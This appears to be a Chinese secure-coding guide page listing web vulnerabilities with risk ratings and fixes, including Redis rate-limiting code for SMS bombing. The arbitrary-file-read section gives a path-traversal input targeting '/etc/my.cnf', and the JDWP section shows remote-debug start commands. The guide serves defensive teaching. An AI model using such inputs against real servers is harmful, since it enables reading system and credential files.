+<h2><a class="anchor" aria-hidden="true" id="敏感信息泄露"></a><a href="#敏感信息泄露" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>敏感信息泄露</h2>
+<h3><a class="anchor" aria-hidden="true" id="html注释中敏感信息泄露"></a><a href="#html注释中敏感信息泄露" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTML注释中敏感信息泄露</h3>
+<p>网站的HTML注释中，存在系统配置相关的敏感信息，这可能导致敏感信息泄漏。有时开发者会忘记从生产环境中除去某些安装、调试或测试注释信息。这些注释信息有可能包括Web用户所不应访问的敏感信息。攻击者可能从这些注释中获得敏感信息以进行进一步的攻击。</p>
+<h3><a class="anchor" aria-hidden="true" id="和外界系统交互时未加密造成敏感信息泄露"></a><a href="#和外界系统交互时未加密造成敏感信息泄露" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>和外界系统交互时未加密造成敏感信息泄露</h3>
+<p>弱加密算法比如base64，相当于明文，也会造成信息泄露</p>
+<h2><a class="anchor" aria-hidden="true" id="敏感信息未模糊化【高风险】"></a><a href="#敏感信息未模糊化【高风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>敏感信息未模糊化【高风险】</h2>
+<p>对客户姓名、身份证、手机号码、地址做模糊化处理。</p>
+<p>模糊化应该由统一的模糊化模块进行模糊化。</p>
+<h2><a class="anchor" aria-hidden="true" id="应用程序未容错【中风险】"></a><a href="#应用程序未容错【中风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>应用程序未容错【中风险】</h2>
+<p>应用程序未屏蔽执行过程中的错误信息，直接抛出了异常，造成敏感信息泄漏。攻击者可从程序的错误信息中获得程序开发框架名称及版本、SQL语句、SQL数据库表名、绝对路径等敏感信息。</p>
+<p>增加try
+catch等容错语句，所有异常必须捕获并处理，禁止直接抛出异常，禁止将异常信息输出到页面中。</p>
+<h2><a class="anchor" aria-hidden="true" id="目录遍历漏洞"></a><a href="#目录遍历漏洞" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>目录遍历漏洞</h2>
+<p>由于中间件配置不当，导致服务器文件目录遍历，攻击者可以直接浏览服务器上存在的所有目录和文件。</p>
+<h2><a class="anchor" aria-hidden="true" id="会话cookie中缺少httponly属性【低风险】"></a><a href="#会话cookie中缺少httponly属性【低风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>会话cookie中缺少HttpOnly属性【低风险】</h2>
+<p>程序设置的会话cookie未包含HttpOnly属性。攻击者可结合XSS跨站等漏洞，通过往页面中插入恶意JS代码的方式获取用户的会话cookie，进而冒用用户身份发起进一步攻击。</p>
+<p>修复方式：为用户cooke设置HttpOnly属性。设置了HttpOnly属性的cookie无法通过js
+document.cookie 获取。</p>
+<p><img src="media/image90.png" alt="">{width=&quot;7.263888888888889in&quot;
+height=&quot;0.41805555555555557in&quot;}</p>
+<h2><a class="anchor" aria-hidden="true" id="浏览器关闭后会话依然可用"></a><a href="#浏览器关闭后会话依然可用" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>浏览器关闭后会话依然可用</h2>
+<p>应用系统未对用户关闭浏览器后做事件处理，导致浏览器关闭后会话依然可用，攻击者可利用此缺陷进行身份冒用。安全建议：监测浏览器关闭事件，当发现浏览器被关闭时提示用户是否退出，或直接不提示结束会话。直接调用登出接口。</p>
+<hr>
+<p>$(<strong><em>window</em></strong>).bind(<strong>'beforeunload'</strong>, <strong>function</strong> () {<br>
+<strong>var</strong> n = <strong><em>window</em></strong>.<strong>event</strong>.screenX - <strong><em>window</em></strong>.<strong>screenLeft</strong>;<br>
+<strong>var</strong> b = n &gt; <strong><em>document</em></strong>.<strong>documentElement</strong>.<strong>scrollWidth</strong> - 20;<br>
+<strong>if</strong> (b &amp;&amp; <strong><em>window</em></strong>.<strong>event</strong>.clientY &lt; 0 || <strong><em>window</em></strong>.<strong>event</strong>.altKey) {<br>
+<em>alert</em>(<strong>&quot;正在退出系统！&quot;</strong>);<br>
+$.<strong>ajax</strong>({<br>
+<strong>url</strong>: <strong>&quot;/logoutUrl&quot;</strong>,<br>
+<strong>data</strong>: {},<br>
+<strong>type</strong>: <strong>&quot;POST&quot;</strong>,<br>
+<strong>async</strong>: <strong>true</strong>,<br>
+success: <strong>function</strong> (data) {<br>
+},<br>
+error: <strong>function</strong> (data) {<br>
+}<br>
+});<br>
+}<br>
+});</p>
+<hr>
+<h2><a class="anchor" aria-hidden="true" id="短信炸弹【高风险】"></a><a href="#短信炸弹【高风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>短信炸弹【高风险】</h2>
+<p>应用程序没有限定一段时间内给同一个用户可发送的短信数量，导致形成短信炸弹漏洞。安全建议：修改短信发送模块源代码，限定一段时间内可发送的短信数量。</p>
+<p>比如验证码，一分钟内只能发送一次，修改前台和后台，前台发送后开始读秒，后台通过redis实现，发送后，在redis设置一个key，1分钟后失效。</p>
+<hr>
+<p>String phoneNumber =<strong>&quot;&quot;</strong>;<br>
+String key = <strong>&quot;VALIDATE_CODE_&quot;</strong> + phoneNumber;<br>
+<strong>if</strong>(JedisUtils.<em>get</em>(key) == <strong>null</strong>){<br>
+JedisUtils.<em>set</em>(key, <strong>&quot;1&quot;</strong>, 60);<br>
+sendMessage();<br>
+}<strong>else</strong>{<br>
+*//1分钟内不能重复发送<br>
+*}</p>
+<hr>
+<p>在实际使用中仍然可能会出现重复发送，攻击者同时发送大量的请求，进入后都会判断不存在key，然后发送短信。解决方法：</p>
+<p>1、加分布式锁（手机号码作为共享资源）</p>
+<hr>
+<p>String phoneNumber = <strong>&quot;&quot;</strong>;
+<br>
+String key = <strong>&quot;VALIDATE_CODE_&quot;</strong> + phoneNumber;
+<br>
+<strong>if</strong> (JedisUtils.<em>setNX</em>(key, <strong>&quot;1&quot;</strong>) == 1) {<br>
+JedisUtils.<em>expire</em>(key, 60);<br>
+sendMessage();
+<br>
+} <strong>else</strong> {
+<br>
+*//1分钟内不能重复发送
+<br>
+*}</p>
+<hr>
+<p>2、图形验证码，但这个也会存在问题</p>
+<h2><a class="anchor" aria-hidden="true" id="内部ip信息泄露【中风险】"></a><a href="#内部ip信息泄露【中风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内部IP信息泄露【中风险】</h2>
+<p>对攻击者而言，泄露的内部IP非常有价值，因为它显示了内部网络的IP地址方案。知道内部网络的IP地址方案，可以辅助攻击者策划出对内部网络进一步的攻击。</p>
+<h2><a class="anchor" aria-hidden="true" id="图形验证码可重复使用【高风险】"></a><a href="#图形验证码可重复使用【高风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>图形验证码可重复使用【高风险】</h2>
+<p>程序存在逻辑问题，没有限定图形验证码的使用次数，导致图形验证码可重复使用。攻击者可利用此缺陷绕过图形验证码的防护进行暴力猜解攻击。</p>
+<p>安全建议：在服务端限定并校验图形验证码的使用次数，每个图形验证码只能使用一次，使用完成后从session中清理掉，然后前台控制每次登录请求完成后，如果失败立刻刷新验证码。</p>
+<h2><a class="anchor" aria-hidden="true" id="http主机头攻击【高风险】"></a><a href="#http主机头攻击【高风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP主机头攻击【高风险】</h2>
+<p>应用程序根据客户端提供的HTTP Header中的Host字段来确定页面中Location
+的值，但并没有判断Host字段的合法性。攻击者可以任意伪造Host字段的值，以使应用程序执行任意JS/HTML脚本，攻击者可以很方便的实现网络钓鱼、XSS跨站、挂马等攻击。</p>
+<p><img src="media/image91.tiff" alt="">{width=&quot;7.263888888888889in&quot;
+height=&quot;1.617361111111111in&quot;}</p>
+<p>安全建议：验证Host字段的合法性。</p>
+<h2><a class="anchor" aria-hidden="true" id="zookeeperrediselasticsearch未授权访问"></a><a href="#zookeeperrediselasticsearch未授权访问" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ZooKeeper/Redis/Elasticsearch未授权访问</h2>
+<p>1、设置授权访问</p>
+<p>2、通过iptables限制访问源</p>
+<h2><a class="anchor" aria-hidden="true" id="枚举漏洞【高风险】"></a><a href="#枚举漏洞【高风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>枚举漏洞【高风险】</h2>
+<p>用户枚举漏洞，号码枚举漏洞，订单枚举漏洞。是否存在这样的接口，比如：</p>
+<p>1、判断手机号码是否在系统中已经存在，通过暴力枚举就可以获取到已注册的手机号码</p>
+<p>2、在登陆过程中，输入错误的账号系统会提示账户不存在，这可以为攻击者枚举系统用户名</p>
+<p>3、订单编号采用自增主键，这样就可以拿到订单总量，如果有类似<a href="http://ip">http://ip</a>:port/getOrderInfo/orderId，类似这样的接口就可以顺序抓取所有的订单信息（涉及机密的数据一定不能采用自增主键）</p>
+<h2><a class="anchor" aria-hidden="true" id="任意文件上传漏洞"></a><a href="#任意文件上传漏洞" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>任意文件上传漏洞</h2>
+<p>应用系统没有验证上传文件的合法性，导致攻击者可以上传恶意文件到服务器，达到获得webshell控制应用系统甚至控制服务器的目的。</p>
+<p>安全建议：</p>
+<p>1、在前端限制可上传的文件类型（通过文件后缀限制）；</p>
+<p>2、在后端验证上传文件的合法性（通过魔数验证文件类型，一般情况下每种类型的文件都有自己的魔数，这也不能达到100%，比如excle的魔数是0x504B，同样提供一个txt文件，首字符是PK，也一样是0x504B）；</p>
+<p>3、限制上传文件的可执行权限。</p>
+<h2><a class="anchor" aria-hidden="true" id="任意文件读取"></a><a href="#任意文件读取" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>任意文件读取</h2>
+<p>是否存在这样的场景：在下载文件的时候不是提供的文件编号ID而是提供的文件路径，下载时直接读取指定路径的文件，这样就可以任意构造路径，比如：../../../etc/my.cnf。</p>
+<p>安全建议：文件统一通过表记录管理，下载文件时只提供记录的编号，后台根据ID拿到路径，再下载。</p>
+<h2><a class="anchor" aria-hidden="true" id="jdwp远程命令执行【中风险】"></a><a href="#jdwp远程命令执行【中风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>JDWP远程命令执行【中风险】</h2>
+<p>JDWP（Java Debugger Wire
+Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target
+VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的develop
+machine 的某一支持 JDWP协议的工具例如Android Studio 或者 JDB，而 Target
+JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP
+Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target
+JVM并最终由该 JVM来处理请求，并把 reply 信息返回给 Debugger 端。</p>
+<p>线上要关闭JDWP。</p>
+<p>Tomcat开启远程调试：<em>./bin/catalina.sh jpda
+start</em>（底层实现和下面的类似），默认8000端口</p>
+<p>Java进程开启远程调试：启动参数中添加<em>-agentlib:jdwp=transport=dt_socket,address=1234,server=y,suspend=n</em></p>
+<p>IDEA连接：</p>
+<p><img src="media/image92.png" alt="">{width=&quot;6.728382545931758in&quot;
+height=&quot;1.460174978127734in&quot;}</p>
+<h2><a class="anchor" aria-hidden="true" id="未限制用户可输入的长度"></a><a href="#未限制用户可输入的长度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>未限制用户可输入的长度</h2>
+<p>应用系统未对用户可输入长度作出限制，恶意攻击者可以通过提交大量垃圾信息造成应用程序/数据库溢出。</p>
+<h2><a class="anchor" aria-hidden="true" id="使用了不安全的http方法"></a><a href="#使用了不安全的http方法" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用了不安全的HTTP方法</h2>
+<p>未禁止使用delete、put等方法，恶意用户或攻击者一旦成功利用此漏洞，将可以通过调用Delete方法恶意删除服务器中的文件，可以调用Put方法上传恶意文件到服务器。</p>
+<h2><a class="anchor" aria-hidden="true" id="输入数据验证逻辑漏洞"></a><a href="#输入数据验证逻辑漏洞" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>输入数据验证逻辑漏洞</h2>
+<blockquote>
+<p>对输入的数据，比如身份证号，仅前端验证，提交到后端后未再次验证。</p>
+</blockquote>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之百万年薪成长之路"></a><a href="#智能互联网之百万年薪成长之路" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之百万年薪成长之路</h1>
+<h2><a class="anchor" aria-hidden="true" id="技术人员发展之道"></a><a href="#技术人员发展之道" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>技术人员发展之道</h2>
+<h2><a class="anchor" aria-hidden="true" id="架构师高度"></a><a href="#架构师高度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>架构师高度</h2>
+<h2><a class="anchor" aria-hidden="true" id="价值评价核心准则"></a><a href="#价值评价核心准则" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>价值评价核心准则</h2>
